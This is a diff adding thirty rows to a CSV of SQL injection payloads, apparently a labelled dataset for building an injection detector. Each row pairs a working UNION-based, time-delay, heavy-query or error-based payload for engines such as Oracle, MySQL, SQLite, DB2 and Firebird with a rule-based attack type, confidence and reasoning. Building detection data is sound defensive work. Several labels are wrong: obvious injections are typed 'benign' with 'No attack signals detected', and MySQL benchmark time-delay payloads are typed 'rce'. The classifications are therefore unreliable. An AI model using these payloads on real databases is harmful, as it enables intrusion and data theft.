@@ -1,0 +1,31 @@
+row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
+2460,"-5217'|| ( select 'juen' from dual where 7336 = 7336 union all select 7336,7336,7336--",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
+2461,1' ) ) as egsj where 3447 = 3447,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2462,"1"" ) as ssbz where 8885 = 8885 union all select null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2463,-6298' or 4724 = 4876,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2464,"select sleep ( 5 ) and ( ( ( ""wucy"" like ""wucy",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
+2465,-1802' or 7931 = 5841--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2466,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'teng' like 'teng",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
+2467,"1 union all select null,null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2468,"1', ( select ( case when ( 1902 = 5536 ) then 1 else 1902* ( select 1902 from master..sysdatabases ) end ) )",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2469,"-1390%"" ) ) union all select 8930,8930,8930,8930,8930#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2470,"1 where 1992 = 1992 union all select null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2471,"1"" and 5205 = 9975#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2472,"1' and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 )",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
+2473,-4057' ) order by 1#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2474,"-8929%' ) union all select 9486,9486,9486,9486#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2475,"-3462 ) ) as biyl where 5143 = 5143 union all select 5143,5143,5143--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2476,"-2570"" or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ""dmch"" like ""dmch",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
+2477,"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( 3127 = 3127",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
+2478,-6218' ) ) or 2236 = 4469#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
+2479,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ""vzft"" = ""vzft",1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
+2480,"-2071 union all select 4753,4753--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2481,"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) -- sztf",1,,rce,generic,0.95,0x4c4d6142 detected — rce injection (priority 1) on generic,rule-based
+2482,"1' or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and 'aezm' like 'aezm",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
+2483,"1"" where 7380 = 7380 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
+2484,"1' ) as rqfq where 7077 = 7077 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
+2485,"-1076 union all select 3959,3959--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2486,"1' ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( 'tpeo' like 'tpeo",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
+2487,"1 ) ) union all select null,null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
+2488,1'|| ( select 'kuxp' where 7123 = 7123 and 1688 = 4200#,1,,boolean_blind,generic,0.95,7123 = 7123 and detected — boolean_blind injection (priority 8) on generic,rule-based
+2489,"-8772%' union all select 4909,4909,4909,4909,4909,4909,4909,4909,4909#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
